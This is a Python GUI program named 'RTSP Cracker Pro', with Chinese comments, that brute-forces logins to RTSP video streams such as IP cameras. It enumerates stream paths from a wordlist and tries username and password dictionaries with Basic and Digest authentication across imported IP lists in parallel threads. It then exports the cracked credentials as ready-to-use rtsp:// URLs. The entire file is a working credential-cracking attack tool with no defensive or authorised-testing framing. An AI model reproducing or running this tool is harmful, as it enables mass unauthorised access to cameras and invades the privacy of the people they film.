import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
import socket
import hashlib
import base64
import os
import sys
from typing import List, Optional
from dataclasses import dataclass
import threading
from datetime import datetime
import time
import re  # 添加re模块导入

@dataclass
class RTSPConfig:
    """RTSP配置类"""
    server_ip: str = ""
    server_port: int = 554
    server_path: str = ""
    user_agent: str = "RTSP Client"
    buffer_len: int = 1024
    username_file: str = ""
    password_file: str = ""
    uri_file: str = ""
    brute_force_method: str = 'Digest'

    @property
    def base_url(self) -> str:
        return f'rtsp://{self.server_ip}:{self.server_port}{self.server_path}'

class RTSPCracker:
    """RTSP破解器类"""
    def __init__(self, config: RTSPConfig):
        self.config = config
        self.socket = None
        self.should_stop = False
        self.is_stopped = False  # 添加停止状态标志

    def connect(self) -> None:
        """建立socket连接"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.config.server_ip, self.config.server_port))
        except socket.error as e:
            print(f"[-] 连接失败: {str(e)}")
            raise

    def gen_base_auth_header(self, username: str, password: str) -> str:
        """生成Basic认证头"""
        auth_64 = base64.b64encode(f"{username}:{password}".encode()).decode()
        header = (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 4\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n'
            f'Authorization: Basic {auth_64}\r\n\r\n'
        )
        return header

    def gen_digest_header(self) -> str:
        """生成Digest认证请求头"""
        return (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 4\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n\r\n'
        )

    def gen_digest_auth_header(self, username: str, password: str, realm: str, nonce: str) -> str:
        """生成Digest认证头"""
        response = self._calculate_digest_response(username, password, realm, nonce)
        return (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 5\r\n'
            f'Authorization: Digest username="{username}", realm="{realm}", '
            f'nonce="{nonce}", uri="{self.config.base_url}", response="{response}"\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n\r\n'
        )

    def _calculate_digest_response(self, username: str, password: str, realm: str, nonce: str) -> str:
        """计算Digest认证响应值"""
        ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(f"DESCRIBE:{self.config.base_url}".encode()).hexdigest()
        return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()

    def try_basic_auth(self, username: str, password: str) -> bool:
        """尝试Basic认证"""
        header = self.gen_base_auth_header(username, password)
        self.socket.send(header.encode())
        response = self.socket.recv(self.config.buffer_len).decode()
        return '200 OK' in response

    def try_digest_auth(self, username: str, password: str) -> bool:
        """尝试Digest认证"""
        # 获取realm和nonce
        header = self.gen_digest_header()
        self.socket.send(header.encode())
        response = self.socket.recv(self.config.buffer_len).decode()
        
        try:
            if 'WWW-Authenticate: Digest' not in response:
                print("[-] 服务器未返回Digest认证信息")
                return False
                
            realm = self._extract_value(response, 'realm')
            nonce = self._extract_value(response, 'nonce')
            
        except ValueError as e:
            print(f"[-] 无法提取realm或nonce值: {str(e)}")
            self.socket.close()
            self.connect()
            return False

        # 发送认证请求
        auth_header = self.gen_digest_auth_header(username, password, realm, nonce)
        try:
            self.socket.send(auth_header.encode())
            response = self.socket.recv(self.config.buffer_len).decode()
            
            if '200 OK' in response:
                return True
            elif 'Unauthorized' in response:
                return False
            else:
                print(f"[*] 未知响应状态")
                return False
                
        except Exception as e:
            print(f"[-] 发送认证请求时发生错误: {str(e)}")
            self.socket.close()
            self.connect()
            return False

    @staticmethod
    def _extract_value(response: str, key: str) -> str:
        """从响应中提取值"""
        try:
            patterns = [
                f'{key}="([^"]*)"',
                f'{key}=([^,\s]*)',
                f'{key}=\'([^\']*)\'',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response)
                if match:
                    return match.group(1)
                    
            raise ValueError(f"在响应中未找到{key}的值")
            
        except Exception as e:
            raise ValueError(f"提取{key}时发生错误: {str(e)}")

    def uri_bruteforce(self) -> Optional[List[str]]:
        """URI路径爆破"""
        if not os.path.exists('uri.txt'):
            print("[-] 未找到uri.txt文件")
            return None

        print("[+] 开始URI路径爆破...")
        found_uris = []

        with open('uri.txt', 'r') as f:
            uris = f.read().splitlines()

        for uri in uris:
            if not uri.strip():
                continue
                
            uri = f"/{uri.lstrip('/')}"
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_socket:
                    test_socket.connect((self.config.server_ip, self.config.server_port))
                    header = (
                        f'DESCRIBE rtsp://{self.config.server_ip}:{self.config.server_port}{uri} RTSP/1.0\r\n'
                        f'CSeq: 1\r\n'
                        f'User-Agent: {self.config.user_agent}\r\n'
                        f'Accept: application/sdp\r\n\r\n'
                    )
                    test_socket.send(header.encode())
                    response = test_socket.recv(self.config.buffer_len).decode()

                    if ('401 Unauthorized' in response or 
                        'WWW-Authenticate' in response or 
                        'Authorization' in response):
                        print(f"[+] 发现有效URI: {uri} (需要认证)")
                        found_uris.append(uri)
                        self.config.server_path = uri
                        return found_uris

            except Exception as e:
                print(f"[-] 测试URI {uri} 时发生错误: {str(e)}")
                continue

        if not found_uris:
            print("[-] 未找到有效URI，将使用默认路径")
            
        return found_uris

    def stop(self):
        """停止破解"""
        self.should_stop = True
        self.is_stopped = True
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

    def brute_force(self) -> tuple:
        """执行暴力破解"""
        self.should_stop = False
        self.is_stopped = False
        try:
            if self.should_stop:
                return False, {}

            self.connect()
            found_uris = self.uri_bruteforce()
            
            if self.should_stop:
                return False, {}

            print(f"[+] 开始使用 {self.config.brute_force_method} 方式进行暴力破解...")
            
            with open(self.config.username_file, "r") as usernames:
                for username in usernames:
                    if self.should_stop:
                        return False, {}
                        
                    username = username.strip()
                    if not username:
                        continue
                        
                    with open(self.config.password_file, "r") as passwords:
                        for password in passwords:
                            if self.should_stop:
                                return False, {}
                                
                            password = password.strip()
                            if not password:
                                continue
                                
                            print(f"[*] 尝试: {username}:{password}")
                            try:
                                if self.should_stop:
                                    return False, {}
                                    
                                if self.config.brute_force_method == 'Basic':
                                    if self.try_basic_auth(username, password):
                                        print(f"[+] 发现有效凭据 -- {username}:{password}")
                                        return True, {
                                            "username": username,
                                            "password": password,
                                            "uri": self.config.server_path
                                        }
                                else:
                                    if self.try_digest_auth(username, password):
                                        print(f"[+] 发现有效凭据 -- {username}:{password}")
                                        return True, {
                                            "username": username,
                                            "password": password,
                                            "uri": self.config.server_path
                                        }
                                        
                            except Exception as e:
                                if self.should_stop:
                                    return False, {}
                                print(f"[-] 尝试 {username}:{password} 时发生错误: {str(e)}")
                                self.socket.close()
                                self.connect()
                                continue

            return False, {}

        finally:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass

class ModernStyle:
    """现代化样式配置"""
    # 颜色方案
    BG_COLOR = "#1e1e1e"  # 深色背景
    FG_COLOR = "#00ff9d"  # 荧光绿
    ACCENT_COLOR = "#2d2d2d"  # 强调色
    HOVER_COLOR = "#3d3d3d"  # 悬停色
    ERROR_COLOR = "#ff5555"  # 错误色
    SUCCESS_COLOR = "#50fa7b"  # 成功色
    
    # 字体
    MAIN_FONT = ("Cascadia Code", 10)  # 主要字体
    TITLE_FONT = ("Cascadia Code", 12, "bold")  # 标题字体
    
    # 样式配置
    BUTTON_STYLE = {
        "background": ACCENT_COLOR,
        "foreground": FG_COLOR,
        "font": MAIN_FONT,
        "borderwidth": 0,
        "padx": 15,
        "pady": 8,
    }
    
    ENTRY_STYLE = {
        "background": ACCENT_COLOR,
        "foreground": FG_COLOR,
        "font": MAIN_FONT,
        "insertbackground": FG_COLOR,  # 光标颜色
    }
    
    # 添加新的样式配置
    TEXT_STYLE = {
        "background": ACCENT_COLOR,
        "foreground": FG_COLOR,
        "font": MAIN_FONT,
        "insertbackground": FG_COLOR,
    }

class ConsoleRedirector:
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, text):
        self.text_widget.insert(tk.END, text)
        self.text_widget.see(tk.END)
        self.text_widget.update()

    def flush(self):
        pass

class ModernButton(tk.Button):
    """现代化按钮"""
    def __init__(self, master, **kwargs):
        super().__init__(master, **ModernStyle.BUTTON_STYLE, **kwargs)
        self.bind("<Enter>", self._on_enter)
        self.bind("<Leave>", self._on_leave)

    def _on_enter(self, e):
        self.config(background=ModernStyle.HOVER_COLOR)

    def _on_leave(self, e):
        self.config(background=ModernStyle.ACCENT_COLOR)

class RTSPCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("RTSP Cracker Pro")
        self.root.configure(bg=ModernStyle.BG_COLOR)
        self.root.geometry("1000x800")
        
        # 创建配置
        self.config = RTSPConfig()
        
        # 创建界面
        self.create_gui()
        
        # 创建RTSP破解器实例
        self.cracker = None
        
        # 标记是否正在运行
        self.is_running = False
        self.stop_flag = threading.Event()  # 添加停止事件
        self.active_threads = []
        self.thread_lock = threading.Lock()
        self.crack_results = []
        
        # 添加线程控制
        self.max_threads = 5  # 默认最大线程数
        self.crackers = {}  # 添加字典来存储每个线程的cracker实例

    def create_gui(self):
        """创建现代化图形界面"""
        # 主容器
        main_container = tk.Frame(self.root, bg=ModernStyle.BG_COLOR)
        main_container.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)

        # 标题栏框架
        title_frame = tk.Frame(main_container, bg=ModernStyle.BG_COLOR)
        title_frame.pack(fill=tk.X, pady=(0, 20))

        # 创建左侧空白框架（用于平衡）
        left_space = tk.Frame(title_frame, bg=ModernStyle.BG_COLOR, width=150)
        left_space.pack(side=tk.LEFT, padx=10)

        # 作者信息（放在右侧）
        authors_label = tk.Label(
            title_frame,
            text="xxtt & 地图大师",
            font=("Cascadia Code", 9, "italic"),
            bg=ModernStyle.BG_COLOR,
            fg="#00cc99"
        )
        authors_label.pack(side=tk.RIGHT, padx=10)

        # 标题（居中）
        title_label = tk.Label(
            title_frame, 
            text="RTSP Cracker Pro",
            font=ModernStyle.TITLE_FONT,
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR
        )
        title_label.pack(expand=True)

        # 添加分隔线
        separator = tk.Frame(
            main_container,
            height=2,
            bg="#00cc99"
        )
        separator.pack(fill=tk.X, pady=(0, 20))

        # 配置区域
        config_frame = self._create_frame(main_container, "配置设置")
        config_frame.pack(fill=tk.X, pady=(0, 10))

        # IP和端口配置
        ip_port_frame = tk.Frame(config_frame, bg=ModernStyle.BG_COLOR)
        ip_port_frame.pack(fill=tk.X, padx=10, pady=5)

        # IP输入区域（改为单行输入框加导入按钮）
        ip_frame = tk.Frame(ip_port_frame, bg=ModernStyle.BG_COLOR)
        ip_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(
            ip_frame,
            text="目标IP:",
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        ).pack(side=tk.LEFT, padx=5)

        self.ip_entry = tk.Entry(
            ip_frame,
            **ModernStyle.ENTRY_STYLE
        )
        self.ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.ip_entry.insert(0, "233.233.233.233")

        # 添加导入IP列表按钮
        self.import_ip_button = ModernButton(
            ip_frame,
            text="导入IP列表",
            command=self.import_ip_list
        )
        self.import_ip_button.pack(side=tk.LEFT, padx=5)

        # 显示已导入IP数量的标签
        self.ip_count_label = tk.Label(
            ip_frame,
            text="",
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        )
        self.ip_count_label.pack(side=tk.LEFT, padx=5)

        # 端口和线程配置
        settings_frame = tk.Frame(ip_port_frame, bg=ModernStyle.BG_COLOR)
        settings_frame.pack(fill=tk.X, pady=5)

        # 端口配置
        port_frame = tk.Frame(settings_frame, bg=ModernStyle.BG_COLOR)
        port_frame.pack(side=tk.LEFT, padx=5)
        
        tk.Label(
            port_frame,
            text="端口:",
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        ).pack(side=tk.LEFT, padx=5)
        
        self.port_entry = tk.Entry(
            port_frame,
            width=10,
            **ModernStyle.ENTRY_STYLE
        )
        self.port_entry.pack(side=tk.LEFT, padx=5)
        self.port_entry.insert(0, "554")

        # 线程数配置
        thread_frame = tk.Frame(settings_frame, bg=ModernStyle.BG_COLOR)
        thread_frame.pack(side=tk.LEFT, padx=20)
        
        tk.Label(
            thread_frame,
            text="最大线程数:",
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        ).pack(side=tk.LEFT, padx=5)
        
        self.thread_spinbox = tk.Spinbox(
            thread_frame,
            from_=1,
            to=20,
            width=5,
            **ModernStyle.ENTRY_STYLE
        )
        self.thread_spinbox.pack(side=tk.LEFT, padx=5)
        self.thread_spinbox.delete(0, tk.END)
        self.thread_spinbox.insert(0, "5")

        # 字典文件选择区域
        files_frame = self._create_frame(main_container, "字典文件")
        files_frame.pack(fill=tk.X, pady=(0, 10))

        self.uri_path = self._create_file_selector(files_frame, "URI字典:", 0)
        self.uri_path.insert(0, os.path.join(os.getcwd(), "uri.txt"))  # 设置默认值
        
        self.username_path = self._create_file_selector(files_frame, "用户名字典:", 1)
        self.username_path.insert(0, os.path.join(os.getcwd(), "username.txt"))  # 设置默认值
        
        self.password_path = self._create_file_selector(files_frame, "密码字典:", 2)
        self.password_path.insert(0, os.path.join(os.getcwd(), "password.txt"))  # 设置默认值

        # 认证方式选择
        auth_frame = self._create_frame(main_container, "认证方式")
        auth_frame.pack(fill=tk.X, pady=(0, 10))

        self.auth_method = tk.StringVar(value="Digest")
        auth_options_frame = tk.Frame(auth_frame, bg=ModernStyle.BG_COLOR)
        auth_options_frame.pack(padx=10, pady=5)

        for method in ["Digest", "Basic"]:
            rb = tk.Radiobutton(auth_options_frame, text=method, variable=self.auth_method,
                              value=method, bg=ModernStyle.BG_COLOR, fg=ModernStyle.FG_COLOR,
                              selectcolor=ModernStyle.ACCENT_COLOR, font=ModernStyle.MAIN_FONT)
            rb.pack(side=tk.LEFT, padx=10)

        # 控制按钮区域
        control_frame = tk.Frame(main_container, bg=ModernStyle.BG_COLOR)
        control_frame.pack(fill=tk.X, pady=(0, 10))

        self.start_button = ModernButton(control_frame, text="开始破解",
                                       command=self.start_crack)
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = ModernButton(control_frame, text="停止",
                                      command=self.stop_crack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.clear_button = ModernButton(control_frame, text="清除输出",
                                       command=self.clear_output)
        self.clear_button.pack(side=tk.LEFT, padx=5)

        self.view_results_button = ModernButton(control_frame, text="查看结果",
                                              command=self.show_results)
        self.view_results_button.pack(side=tk.LEFT, padx=5)

        self.export_url_button = ModernButton(control_frame, text="导出RTSP链接",
                                            command=self.export_rtsp_urls)
        self.export_url_button.pack(side=tk.LEFT, padx=5)

        # 输出区域
        output_frame = self._create_frame(main_container, "输出日志")
        output_frame.pack(fill=tk.BOTH, expand=True)

        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            bg=ModernStyle.ACCENT_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT,
            padx=10,
            pady=10,
            height=25  # 增加文本框高度
        )
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 重定向标准输出
        sys.stdout = ConsoleRedirector(self.output_text)

    def _create_frame(self, parent, title):
        """创建带标题的框架"""
        frame = tk.LabelFrame(
            parent,
            text=title,
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        )
        return frame

    def _create_labeled_entry(self, parent, label_text, row):
        """创建带标签的输入框"""
        tk.Label(
            parent,
            text=label_text,
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        ).grid(row=row, column=0, padx=5, pady=5)

        entry = tk.Entry(
            parent,
            **ModernStyle.ENTRY_STYLE
        )
        entry.grid(row=row, column=1, padx=5, pady=5, sticky='ew')
        return entry

    def _create_file_selector(self, parent, label_text, row):
        """创建文件选择器"""
        frame = tk.Frame(parent, bg=ModernStyle.BG_COLOR)
        frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(
            frame,
            text=label_text,
            bg=ModernStyle.BG_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT
        ).pack(side=tk.LEFT, padx=5)

        entry = tk.Entry(frame, **ModernStyle.ENTRY_STYLE)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        ModernButton(
            frame,
            text="浏览",
            command=lambda e=entry: self.browse_file(e, f"选择{label_text}")
        ).pack(side=tk.LEFT, padx=5)

        return entry

    def browse_file(self, entry_widget, title):
        filename = filedialog.askopenfilename(title=title)
        if filename:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, filename)

    def clear_output(self):
        """清除输出区域并重置IP输入"""
        self.output_text.delete(1.0, tk.END)
        # 重置IP输入状态
        self.ip_entry.configure(state='normal')
        self.ip_entry.delete(0, tk.END)
        self.ip_entry.insert(0, "233.233.233.233")
        self.ip_count_label.configure(text="")
        if hasattr(self, 'target_ips'):
            self.target_ips = []

    def update_config(self):
        """更新配置"""
        try:
            # 获取IP
            if hasattr(self, 'target_ips'):
                if not self.target_ips:
                    raise ValueError("请输入或导入目标IP")
            else:
                # 如果没有导入列表，使用输入框的IP
                ip = self.ip_entry.get().strip()
                if not ip or "已导入" in ip:
                    raise ValueError("请输入或导入目标IP")
                self.target_ips = [ip]
            
            self.config.server_port = int(self.port_entry.get())
            self.max_threads = int(self.thread_spinbox.get())
            
            # 获取文件路径
            uri_path = self.uri_path.get() or os.path.join(os.getcwd(), "uri.txt")
            username_path = self.username_path.get() or os.path.join(os.getcwd(), "username.txt")
            password_path = self.password_path.get() or os.path.join(os.getcwd(), "password.txt")
            
            self.config.uri_file = uri_path
            self.config.username_file = username_path
            self.config.password_file = password_path
            self.config.brute_force_method = self.auth_method.get()
            
        except ValueError as e:
            print(f"[-] 配置更新错误: {str(e)}")
            raise

    def crack_single_target(self, ip):
        """对单个目标进行破解"""
        try:
            if not self.is_running or self.stop_flag.is_set():
                return

            config = RTSPConfig()
            config.server_ip = ip
            config.server_port = self.config.server_port
            config.uri_file = self.config.uri_file
            config.username_file = self.config.username_file
            config.password_file = self.config.password_file
            config.brute_force_method = self.config.brute_force_method

            cracker = RTSPCracker(config)
            with self.thread_lock:
                self.crackers[threading.current_thread()] = cracker

            print(f"[*] 开始破解目标: {ip}")

            while not self.stop_flag.is_set():
                success, result = cracker.brute_force()
                if success:
                    with self.thread_lock:
                        self.add_crack_result(
                            ip=ip,
                            port=config.server_port,
                            username=result['username'],
                            password=result['password'],
                            uri=result.get('uri', '')
                        )
                    break
                if cracker.is_stopped or self.stop_flag.is_set():
                    break

            if self.is_running and not self.stop_flag.is_set():
                print(f"[*] 完成目标: {ip}")

        except Exception as e:
            if self.is_running and not self.stop_flag.is_set():
                print(f"[-] 破解 {ip} 时发生错误: {str(e)}")
        finally:
            with self.thread_lock:
                if threading.current_thread() in self.crackers:
                    try:
                        self.crackers[threading.current_thread()].stop()
                    except:
                        pass
                    del self.crackers[threading.current_thread()]
                if threading.current_thread() in self.active_threads:
                    self.active_threads.remove(threading.current_thread())

    def start_crack(self):
        """开始破解"""
        if self.is_running:
            return

        try:
            self.update_config()
            
            # 验证IP列表
            if not self.target_ips:  # 改为检查target_ips而不是server_ip
                print("[-] 请输入至少一个目标IP地址")
                return
            
            # 验证文件是否存在
            required_files = {
                "URI字典": self.config.uri_file,
                "用户名字典": self.config.username_file,
                "密码字典": self.config.password_file
            }
            
            missing_files = []
            for name, path in required_files.items():
                if not os.path.exists(path):
                    missing_files.append(f"{name}({path})")
            
            if missing_files:
                print(f"[-] 以下文件不存在:\n" + "\n".join(missing_files))
                return

            self.is_running = True
            self.start_button.configure(state=tk.DISABLED)
            self.stop_button.configure(state=tk.NORMAL)

            # 在新线程中运行破解
            self.crack_thread = threading.Thread(target=self.run_crack)
            self.crack_thread.start()
            
        except Exception as e:
            print(f"[-] 启动错误: {str(e)}")
            self.is_running = False

    def stop_crack(self):
        """停止破解"""
        if not self.is_running:
            return

        print("[*] 正在停止所有任务...")
        self.is_running = False
        self.stop_flag.set()  # 设置停止标志

        # 停止所有正在运行的破解器
        with self.thread_lock:
            for cracker in self.crackers.values():
                try:
                    cracker.stop()
                except:
                    pass

        # 等待所有线程完成
        for thread in self.active_threads.copy():
            try:
                thread.join(timeout=1)  # 给每个线程1秒钟时间结束
            except:
                pass

        # 强制终止未能正常结束的线程
        with self.thread_lock:
            for thread in self.active_threads.copy():
                if thread.is_alive():
                    try:
                        thread._stop()  # 强制终止线程
                    except:
                        pass

        # 清理资源
        with self.thread_lock:
            self.crackers.clear()
            self.active_threads.clear()

        self.stop_flag.clear()  # 重置停止标志
        print("[+] 所有任务已停止")
        self.start_button.configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk.DISABLED)

    def run_crack(self):
        """运行破解过程"""
        try:
            for ip in self.target_ips:
                if not self.is_running:
                    break
                    
                # 等待线程数量低于最大值
                while len(self.active_threads) >= self.max_threads:
                    if not self.is_running:
                        break
                    # 清理已完成的线程
                    self.active_threads = [t for t in self.active_threads if t.is_alive()]
                    time.sleep(0.1)
                    
                if not self.is_running:
                    break
                    
                # 创建新线程
                thread = threading.Thread(target=self.crack_single_target, args=(ip,))
                with self.thread_lock:
                    self.active_threads.append(thread)
                thread.start()
            
            # 等待所有活动线程完成
            while self.active_threads and self.is_running:
                self.active_threads = [t for t in self.active_threads if t.is_alive()]
                time.sleep(0.1)
            
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
        finally:
            self.is_running = False
            self.root.after(100, self._update_buttons)

    def _update_buttons(self):
        """在主线程中更新按钮状态"""
        self.start_button.configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk.DISABLED)

    def import_ip_list(self):
        """导入IP列表"""
        filename = filedialog.askopenfilename(
            title="选择IP列表文件",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'r') as f:
                    ip_list = [ip.strip() for ip in f.readlines() if ip.strip()]
                
                if not ip_list:
                    print("[-] IP列表文件为空")
                    return

                self.target_ips = ip_list
                self.ip_entry.delete(0, tk.END)
                self.ip_entry.insert(0, f"已导入 {len(ip_list)} 个目标")
                self.ip_entry.configure(state='readonly')
                
                # 更新IP数量显示
                self.ip_count_label.configure(
                    text=f"[共 {len(ip_list)} 个目标]",
                    fg=ModernStyle.SUCCESS_COLOR
                )
                print(f"[+] 成功导入 {len(ip_list)} 个目标IP")
                
            except Exception as e:
                print(f"[-] 导入IP列表失败: {str(e)}")

    def add_crack_result(self, ip, port, username, password, uri=""):
        """添加破解成功的结果"""
        result = {
            "ip": ip,
            "port": port,
            "username": username,
            "password": password,
            "uri": uri,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        self.crack_results.append(result)

    def show_results(self):
        """显示破解结果窗口"""
        results_window = tk.Toplevel(self.root)
        results_window.title("破解成功结果")
        results_window.configure(bg=ModernStyle.BG_COLOR)
        results_window.geometry("800x600")  # 增加窗口大小
        
        # 设置窗口在主窗口中居中
        results_window.transient(self.root)
        x = self.root.winfo_x() + (self.root.winfo_width() - 800) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - 600) // 2
        results_window.geometry(f"800x600+{x}+{y}")
        results_window.grab_set()

        # 创建结果显示区域
        results_text = scrolledtext.ScrolledText(
            results_window,
            bg=ModernStyle.ACCENT_COLOR,
            fg=ModernStyle.FG_COLOR,
            font=ModernStyle.MAIN_FONT,
            padx=10,
            pady=10
        )
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        if not self.crack_results:
            results_text.insert(tk.END, "暂无破解成功的结果\n")
        else:
            results_text.insert(tk.END, "=== RTSP URLs ===\n\n")
            # 首先显示所有RTSP URLs
            for result in self.crack_results:
                rtsp_url = (f"rtsp://{result['username']}:{result['password']}@"
                           f"{result['ip']}:{result['port']}{result['uri']}")
                results_text.insert(tk.END, f"{rtsp_url}\n")
            
            # 然后显示详细信息
            results_text.insert(tk.END, "\n=== 详细信息 ===\n\n")
            for i, result in enumerate(self.crack_results, 1):
                results_text.insert(tk.END, f"[设备 {i}]\n")
                results_text.insert(tk.END, f"发现时间: {result['time']}\n")
                results_text.insert(tk.END, f"设备地址: {result['ip']}:{result['port']}\n")
                results_text.insert(tk.END, f"登录凭据: {result['username']}:{result['password']}\n")
                if result['uri']:
                    results_text.insert(tk.END, f"访问路径: {result['uri']}\n")
                results_text.insert(tk.END, "="*30 + "\n\n")

        # 添加按钮框架
        button_frame = tk.Frame(results_window, bg=ModernStyle.BG_COLOR)
        button_frame.pack(pady=10)

        # 添加复制按钮
        copy_button = ModernButton(
            button_frame,
            text="复制RTSP链接",
            command=lambda: self.copy_rtsp_urls(self.crack_results)
        )
        copy_button.pack(side=tk.LEFT, padx=5)

        export_button = ModernButton(
            button_frame,
            text="导出结果",
            command=lambda: self.export_results(self.crack_results)
        )
        export_button.pack(side=tk.LEFT, padx=5)

        close_button = ModernButton(
            button_frame,
            text="关闭",
            command=results_window.destroy
        )
        close_button.pack(side=tk.LEFT, padx=5)

    def copy_rtsp_urls(self, results):
        """复制RTSP URLs到剪贴板"""
        if not results:
            print("[-] 没有可复制的结果")
            return
        
        urls = []
        for result in results:
            rtsp_url = (f"rtsp://{result['username']}:{result['password']}@"
                       f"{result['ip']}:{result['port']}{result['uri']}")
            urls.append(rtsp_url)
        
        # 将所有URL复制到剪贴板
        self.root.clipboard_clear()
        self.root.clipboard_append('\n'.join(urls))
        print("[+] RTSP链接已复制到剪贴板")

    def export_results(self, results):
        """导出破解结果"""
        if not results:
            print("[-] 没有可导出的结果")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt")],
            title="导出破解结果"
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("=== RTSP破解结果 ===\n\n")
                    for result in results:
                        f.write(f"时间: {result['time']}\n")
                        f.write(f"IP地址: {result['ip']}\n")
                        f.write(f"端口: {result['port']}\n")
                        f.write(f"用户名: {result['username']}\n")
                        f.write(f"密码: {result['password']}\n")
                        if result['uri']:
                            f.write(f"URI: {result['uri']}\n")
                        f.write("="*30 + "\n\n")
                print(f"[+] 结果已导出到: {filename}")
            except Exception as e:
                print(f"[-] 导出结果失败: {str(e)}")

    def export_rtsp_urls(self):
        """导出RTSP URL格式的结果"""
        if not self.crack_results:
            print("[-] 没有可导出的结果")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt")],
            title="导出RTSP链接"
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("=== RTSP URLs ===\n\n")
                    for result in self.crack_results:
                        # 构建RTSP URL
                        rtsp_url = (f"rtsp://{result['username']}:{result['password']}@"
                                  f"{result['ip']}:{result['port']}{result['uri']}")
                        f.write(f"{rtsp_url}\n")
                        
                    # 添加说明信息
                    f.write("\n=== 详细信息 ===\n")
                    for i, result in enumerate(self.crack_results, 1):
                        f.write(f"\n[设备 {i}]\n")
                        f.write(f"发现时间: {result['time']}\n")
                        f.write(f"设备地址: {result['ip']}:{result['port']}\n")
                        f.write(f"登录凭据: {result['username']}:{result['password']}\n")
                        if result['uri']:
                            f.write(f"访问路径: {result['uri']}\n")
                        f.write("-" * 30 + "\n")
                        
                print(f"[+] RTSP链接已导出到: {filename}")
                
                # 自动打开导出的文件
                try:
                    os.startfile(filename)
                except:
                    pass  # 如果无法自动打开文件，则忽略
                    
            except Exception as e:
                print(f"[-] 导出RTSP链接失败: {str(e)}")

def main():
    root = tk.Tk()
    app = RTSPCrackerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main() 